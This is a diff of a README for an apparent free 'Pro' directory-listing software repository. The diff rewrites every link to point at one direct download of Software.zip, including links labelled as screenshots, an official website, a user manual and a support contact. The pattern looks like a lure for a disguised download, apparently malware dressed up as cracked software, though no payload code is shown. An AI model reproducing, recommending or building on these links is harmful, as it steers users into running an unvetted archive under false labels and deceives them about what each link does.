@@ -14,15 +14,15 @@ Explore the following topics related to directory list and print:
 - Free download directory list
 
 ## Get Started
-To dive into the world of directory list and printing, download the latest version of our software by clicking [here](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0).
+To dive into the world of directory list and printing, download the latest version of our software by clicking [here](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip).
 
 🚀 *Launch the software* 🚀
 
 ## Gallery
 Check out some screenshots of our directory list and print software in action:
 
-![Screenshot 1](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0)
-![Screenshot 2](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0)
+![Screenshot 1](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip)
 
 ## Contributions
 Contributions to the repository are welcome! If you have suggestions, improvements, or new features to add, feel free to submit a pull request.
@@ -31,11 +31,11 @@ Contributions to the repository are welcome! If you have suggestions, improvemen
 For detailed instructions on how to use the directory list and print software, refer to the documentation provided in the repository. Whether you're a beginner or an experienced user, you'll find all the information you need to make the most of our tools.
 
 ## Resources
-- [Official Website](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0)
-- [User Manual](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0)
+- [Official Website](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip)
+- [User Manual](https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip)
 
 ## Support
-If you encounter any issues or have any questions, please reach out to our support team at https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/tag/v1.0
+If you encounter any issues or have any questions, please reach out to our support team at https://github.com/nissabear/Directory-List-and-Print-Pro-Free/releases/download/v2.0/Software.zip
 
 Let's make directory list and printing a breeze! 🌟
 
